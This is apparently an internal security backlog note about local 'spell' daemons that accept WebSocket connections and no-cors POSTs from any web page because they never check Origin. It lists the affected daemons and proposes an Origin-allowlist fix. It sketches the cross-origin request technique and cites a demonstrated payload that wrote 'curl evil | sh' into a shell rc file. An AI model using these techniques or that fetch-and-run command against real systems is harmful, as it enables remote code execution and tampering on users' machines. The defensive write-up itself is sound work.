# Backlog — spell daemons accept a WebSocket (and a POST) from any web page

**Status:** backlog (not scheduled). Captured 2026-09-11 by scriptorium's
slice-A verify pass. **Severity:** state tampering, not file writes — for every
spell except the one already fixed.

## The finding

A spell daemon binds `127.0.0.1` and trusts whoever connects. But a web page the
human has open in the same browser can reach `127.0.0.1` too:

- **WebSocket has no CORS.** `new WebSocket("ws://127.0.0.1:<port>/ws")` from
  any origin connects, and the browser sends that page's `Origin` header — which
  no daemon reads.
- **A "simple" POST needs no preflight.**
  `fetch(url, {method: "POST", mode: "no-cors", body: "<json>"})` with a
  `text/plain` body reaches the handler, and the daemons parse the body with
  `req.json()` whatever its content type. The page cannot read the answer, but
  the command runs.

The port is ephemeral for per-session spells, which slows a guesser but does not
stop one: a page can sweep a port range in seconds. The standing daemons
(astrolabe, grapevine, mind-mapper) publish their port in a file under the
spell's home, not the page's reach, but their ports are also scannable.

**scriptorium was the case with a real payload** — its WebSocket `open` + `save`
wrote `curl evil | sh` into a `.rc` file outside the session (verify pass,
`f-origin.ts`). It is fixed on `feat/scriptorium-foundation`: a foreign `Origin`
on `/ws`, `/cmd` and `/fs/*` is refused with 403, and `open`/`save` admit only
documents inside a context entry (`sameOrigin` in
`src/scriptorium/backend/server.ts`).

## The other daemons — measured 2026-09-11 by grep, not driven

No daemon below reads `Origin` anywhere (`grep -i origin` finds only prose).
None of them writes a user file from a socket message, so the exposure is a
foreign page driving the spell's STATE — posting to a channel, moving a card,
marking up a board — as if it were the human or the agent.

| spell       | entry                               | foreign-page reach                                                                      |
| ----------- | ----------------------------------- | --------------------------------------------------------------------------------------- |
| astrolabe   | `src/astrolabe/backend/server.ts`   | WebSocket upgrade (`/ws`), POST routes                                                  |
| bounty      | `src/bounty/backend/server.ts`      | WebSocket upgrade, `/cmd`-style POSTs (card state)                                      |
| glamour     | `src/glamour/backend/server.ts`     | WebSocket upgrade, `POST /cmd` (library, style guide)                                   |
| imago       | `src/imago/backend/server.ts`       | WebSocket upgrade, `POST /cmd` (canvas, context)                                        |
| magpie      | `src/magpie/backend/server.ts`      | WebSocket upgrade, `POST /cmd` (bboxes, extraction)                                     |
| mind-mapper | `src/mind-mapper/backend/server.ts` | WebSocket upgrade, POST routes (map proposals, marks)                                   |
| grapevine   | `src/grapevine/backend/daemon.ts`   | no WebSocket; POST `/channels/:name/messages` — a page could post into an agent channel |
| digestify   | `src/digestify/backend/review.ts`   | single-shot; POST `/submit`/`/cancel` could end a review with forged answers            |

## The shape of the fix (not done here)

scriptorium's rule is small enough to be a kit primitive: **an absent `Origin`
(the CLI, curl) or the daemon's own `http://127.0.0.1:<port>` /
`http://localhost:<port>` is admitted; anything else gets 403**, checked before
`srv.upgrade` and before any state-changing route. It belongs in `src/kit/wire/`
beside `serveDist` (which already decides what a page may READ), with a ward
that every daemon's `upgrade(` and POST handler sit behind it — the same
"population follows the subject" shape as the other daemon wards.

Not fixed in the scriptorium branch on purpose: it touches eight spells' wire
behaviour, and each needs its own drive.
